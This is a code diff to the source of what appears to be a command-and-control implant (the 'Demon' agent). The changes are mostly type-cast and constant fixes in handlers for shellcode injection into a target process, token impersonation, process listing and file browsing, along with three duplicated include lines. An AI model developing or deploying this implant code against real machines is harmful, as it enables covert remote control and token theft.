@@ -11,6 +11,9 @@
 #include <core/Dotnet.h>
 #include <core/Kerberos.h>
 #include <core/CoffeeLdr.h>
+#include <core/Runtime.h>
+#include <core/Runtime.h>
+#include <core/Runtime.h>
 #include <inject/Inject.h>
 
 SEC_DATA DEMON_COMMAND DemonCommands[] = {
@@ -387,7 +390,7 @@ VOID CommandProc( PPARSER Parser )
                         PackageAddWString( Package, SysProcessInfo->ImageName.Buffer );
                         PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->UniqueProcessId  );
                         PackageAddInt32( Package, ( DWORD ) ( ULONG_PTR ) SysProcessInfo->InheritedFromUniqueProcessId );
-                        PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
+                        PackageAddBytes( Package, ( PBYTE ) UserDomain.Buffer, UserDomain.Length );
                         PackageAddInt32( Package, ProcessIsWow( hProcess ) ? 86 : 64 );
 
                         if ( hProcess ) {
@@ -625,13 +628,13 @@ VOID CommandProcList(
             }
 
             /* Now we append the collected process data to the process list  */
-            PackageAddBytes( Package, SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
+            PackageAddBytes( Package, ( PBYTE ) SysProcessInfo->ImageName.Buffer, SysProcessInfo->ImageName.Length );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->UniqueProcessId ) );
             PackageAddInt32( Package, x86 );
             PackageAddInt32( Package, U_PTR( SysProcessInfo->InheritedFromUniqueProcessId ) );
             PackageAddInt32( Package, SysProcessInfo->SessionId );
             PackageAddInt32( Package, SysProcessInfo->NumberOfThreads );
-            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
+            PackageAddBytes( Package, ( PBYTE ) UserDomain.Buffer, UserDomain.Length );
 
 #ifdef DEBUG
             /* ignore this. is just for the debug prints.
@@ -707,7 +710,7 @@ VOID CommandFS( PPARSER Parser )
             LPWSTR           Ends         = NULL;
             PDIR_OR_FILE     DirOrFile    = NULL;
             PDIR_OR_FILE     TmpDirOrFile = NULL;
-            UINT32           PathSize     = NULL;
+            UINT32           PathSize     = 0;
 
             FileExplorer = ParserGetBool( Parser );
             TargetFolder = ParserGetWString( Parser, NULL );
@@ -1296,8 +1299,8 @@ VOID CommandInjectShellcode(
     Way     = ParserGetInt32( Parser );
     Method  = ParserGetInt32( Parser );
     x64     = ParserGetInt32( Parser );
-    Payload = ParserGetBytes( Parser, &Size );
-    Argv    = ParserGetBytes( Parser, &Argc );
+    Payload = ParserGetBytes( Parser, ( PUINT32 ) &Size );
+    Argv    = ParserGetBytes( Parser, ( PUINT32 ) &Argc );
     Pid     = ParserGetInt32( Parser );
 
     PRINTF(
@@ -1400,7 +1403,7 @@ VOID CommandToken( PPARSER Parser )
             if ( TokenData )
             {
                 PackageAddInt32( Package, ImpersonateTokenInStore( TokenData ) );
-                PackageAddString( Package, TokenData->DomainUser );
+                PackageAddWString( Package, TokenData->DomainUser );
             }
             else
             {
@@ -1450,7 +1453,7 @@ VOID CommandToken( PPARSER Parser )
 
             PRINTF( "[^] New Token added to the Vault: %d User:[%ls]\n", NewTokenID, UserDomain.Buffer );
 
-            PackageAddBytes( Package, UserDomain.Buffer, UserDomain.Length );
+            PackageAddBytes( Package, ( PBYTE ) UserDomain.Buffer, UserDomain.Length );
             PackageAddInt32( Package, NewTokenID );
             PackageAddInt32( Package, TargetPid );
 
@@ -1548,7 +1551,7 @@ VOID CommandToken( PPARSER Parser )
             PWCHAR lpUser         = ParserGetWString( Parser, &dwUserSize );
             PWCHAR lpPassword     = ParserGetWString( Parser, &dwPasswordSize );
             DWORD  LogonType      = ParserGetInt32( Parser );
-            CHAR   Deli[ 2 ]      = { '\\', 0 };
+            WCHAR  Deli[ 2 ]      = { L'\\', 0 };
             HANDLE hToken         = NULL;
             PWCHAR UserDomain     = NULL;
             LPWSTR BufferUser     = NULL;
@@ -3479,7 +3482,7 @@ VOID CommandExit( PPARSER Parser )
      */
 
     ImageBase = Instance->Session.ModuleBase;
-    ImageSize = NULL;
+    ImageSize = 0;
 
     RopExit.ContextFlags = CONTEXT_FULL;
     Instance->Win32.RtlCaptureContext( &RopExit );
